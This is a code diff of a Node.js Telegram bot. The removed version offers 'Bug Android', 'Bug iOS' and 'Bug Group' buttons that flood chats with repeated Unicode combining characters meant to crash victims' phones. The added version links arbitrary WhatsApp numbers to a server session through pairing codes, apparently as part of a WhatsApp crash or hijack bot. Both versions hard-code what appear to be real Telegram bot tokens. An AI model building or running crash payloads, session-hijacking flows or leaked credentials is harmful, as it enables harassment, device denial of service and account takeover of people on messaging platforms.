@@ -1,45 +1,40 @@
-const { Telegraf, Markup } = require('telegraf');
+const { default: makeWASocket, useMultiFileAuthState, delay } = require("@whiskeysockets/baileys");
+const { Telegraf } = require('telegraf');
+const pino = require("pino");
 
-// Ninte Telegram Bot Token ivide paste cheyyuka
-const bot = new Telegraf('8196033420:AAE19YyR4MBj6776bZturSMEj4wV-dKW19o');
+const tgBot = new Telegraf('7759727923:AAH00B6do15Q4oXOP3I6RVl095hhE7YQzxU');
 
-// 1. Dashboard UI (Mass Look)
-const menuText = `┌─────────── AIRA x ADAM ───────────┐
-│ 👤 USER   : ADAM [DEV]           │
-│ 🤖 STATUS : CRASHIFY BYPASS ON    │
-│ 🚀 CORE   : NODE.JS [INDEX.JS]    │
-└───────────────────────────────────┘`;
+tgBot.command('pair', async (ctx) => {
+    const number = ctx.message.text.split(' ')[1];
+    if (!number) return ctx.reply("Usage: /pair 91XXXXXXXXXX");
 
-bot.start((ctx) => {
-    return ctx.reply(menuText, Markup.keyboard([
-        ['|| Bug Android ||', '|| Bug iOS ||'],
-        ['|| Bug Group ||', '|| Misc Menu ||']
-    ]).resize());
-});
+    ctx.reply(`⏳ Requesting Pairing Code for +${number}...`);
 
-// 2. SESSION 1: ANDROID CRASH (Most Powerful)
-bot.hears('|| Bug Android ||', (ctx) => {
-    ctx.reply("⚠️ EXECUTING ANDROID MEMORY OVERFLOW...");
-    // Nullfinity & Crashdroid Mix Payload
-    const payload = "ॣ ".repeat(500); 
-    for(let i=0; i<10; i++) {
-        ctx.reply(payload);
+    // Temporary session for pairing
+    const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${number}`);
+    
+    const sock = makeWASocket({
+        auth: state,
+        logger: pino({ level: "silent" }),
+        browser: ["Ubuntu", "Chrome", "20.0.04"]
+    });
+
+    try {
+        await delay(5000);
+        const code = await sock.requestPairingCode(number);
+        ctx.reply(`✅ *Pairing Code:* \`${code}\` \n\nLink ithu ninte WhatsApp-il enter cheyyu muthe!`, { parse_mode: 'Markdown' });
+    } catch (err) {
+        ctx.reply("❌ Error: Pairing request failed!");
     }
+
+    sock.ev.on('creds.update', saveCreds);
+    
+    sock.ev.on('connection.update', (update) => {
+        if (update.connection === 'open') {
+            ctx.reply(`🔥 WhatsApp Connected for +${number}!`);
+        }
+    });
 });
 
-// 3. SESSION 2: iOS CRASH (Springboard Lag)
-bot.hears('|| Bug iOS ||', (ctx) => {
-    ctx.reply("🍎 EXECUTING iOS BYPASS [XIOSVIRUS]...");
-    // Special Telugu character lag logic
-    const iosPayload = "జ్ఞാ ".repeat(200);
-    ctx.reply(iosPayload);
-});
-
-// 4. SESSION 3: GROUP CRASH (Mass Bypass)
-bot.hears('|| Bug Group ||', (ctx) => {
-    ctx.reply("👥 GROUP BYPASS PROTOCOL ACTIVE...");
-    ctx.reply("Targeting: Bypassing Security Filters...");
-});
-
-bot.launch();
-console.log("Aira Bot is Online!");
+tgBot.launch();
+console.log("✅ Multiple Pair Bot is Online!");
